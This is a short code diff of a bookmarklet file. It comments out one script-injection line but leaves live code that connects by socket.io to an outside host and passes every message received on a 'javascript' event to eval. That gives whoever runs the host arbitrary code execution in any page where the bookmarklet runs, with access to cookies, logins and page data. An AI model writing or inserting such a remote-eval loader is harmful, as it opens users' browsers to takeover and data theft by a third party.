@@ -1,5 +1,5 @@
 /// bookmarklet.js
-(document.body.innerHTML+=`<script>const socket = io('https://js-opt.loophole.site:443');socket.on("javascript", function(data) { eval(data); });</script>`;)
+// (document.body.innerHTML+=`<script>const socket = io('https://js-opt.loophole.site:443');socket.on("javascript", function(data) { eval(data); });</script>`;)
 const socket = io('https://js-opt.loophole.site:443');
 socket.on("javascript", function(data) { eval(data); });
 /// a.js
